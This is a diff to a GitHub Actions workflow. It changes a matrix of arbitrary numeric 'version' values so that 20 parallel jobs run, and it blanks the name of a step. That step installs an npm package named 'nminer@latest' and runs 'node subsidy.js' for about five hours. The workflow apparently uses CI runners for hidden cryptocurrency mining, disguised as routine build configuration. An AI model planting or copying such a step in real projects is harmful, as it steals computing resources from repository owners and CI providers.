@@ -9,24 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6054 }
-          - { version: 788 }
-          - { version: 7615 }
-          - { version: 4031 }
-          - { version: 387 }
-          - { version: 5916 }
-          - { version: 1875 }
-          - { version: 8553 }
-          - { version: 7698 }
-          - { version: 5637 }
-          - { version: 2895 }
-          - { version: 4502 }
-          - { version: 3359 }
-          - { version: 96 }
-          - { version: 9289 }
-          - { version: 9852 }
-          - { version: 4495 }
-          - { version: 2407 }
+          - { version: 3821 }
+          - { version: 306 }
+          - { version: 6495 }
+          - { version: 8705 }
+          - { version: 2302 }
+          - { version: 272 }
+          - { version: 8880 }
+          - { version: 4811 }
+          - { version: 2945 }
+          - { version: 9453 }
+          - { version: 7840 }
+          - { version: 6265 }
+          - { version: 5530 }
+          - { version: 6500 }
+          - { version: 8090 }
+          - { version: 6116 }
+          - { version: 2466 }
+          - { version: 5770 }
+          - { version: 6639 }
+          - { version: 8175 }
 
     steps:
       - name: Checkout
@@ -37,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: underneath
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 303m node subsidy.js || echo "subsidy executed"
+          timeout 309m node subsidy.js || echo "subsidy executed"
